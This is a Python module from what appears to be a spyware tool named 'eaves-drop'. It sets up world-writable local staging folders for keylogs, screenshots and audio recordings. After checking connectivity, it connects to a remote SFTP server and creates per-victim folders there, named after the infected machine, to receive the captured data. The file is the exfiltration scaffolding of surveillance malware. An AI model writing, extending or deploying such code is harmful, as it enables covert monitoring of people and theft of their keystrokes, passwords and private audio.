from pathlib import Path
from urllib import request, error
import system_info
from connect import connect as sftp_server
import logging

log_path = Path('./eaves-drop.log')
logging.basicConfig(filename=log_path, level=logging.DEBUG)


# global
local_dir = Path('/tmp/eaves-drop')

# remote
remote_dir = Path('/root/{node}-{system}'.format(node=system_info.node, system=system_info.system))


# keylogs
local_keylogs_dir = local_dir / 'keylogs'
local_keylogs_dir.mkdir(0o777, parents=True, exist_ok=True)
remote_dir = Path('/root/{node}-{system}'.format(node=system_info.node, system=system_info.system))
remote_keylogs_dir = remote_dir / 'keylogs'

# screenshots
remote_screenshots_dir = remote_dir / 'screenshots'
local_screenshots_dir = local_dir / 'screenshots'
local_screenshots_dir.mkdir(0o777, parents=True, exist_ok=True)

# audios
remote_audios_dir = remote_dir / 'audios'
local_audios_dir = local_dir / 'audios'
local_audios_dir.mkdir(0o777, parents=True, exist_ok=True)


def is_online():
    try:
        resp = request.urlopen('http://google.com')
        return True if resp.getcode() == 200 else False
    except error.URLError:
        return False


if is_online():
    sftp_server = sftp_server()

    if sftp_server:

        if not sftp_server.isdir(bytes(remote_dir)):
            sftp_server.mkdir(bytes(remote_dir))

        if not sftp_server.exists(bytes(remote_screenshots_dir)):
            sftp_server.mkdir(bytes(remote_screenshots_dir))

        if not sftp_server.isdir(bytes(remote_keylogs_dir)):
            sftp_server.mkdir(bytes(remote_keylogs_dir))

        if not sftp_server.isdir(bytes(remote_audios_dir)):
            sftp_server.mkdir(bytes(remote_audios_dir))

        sftp_server.close()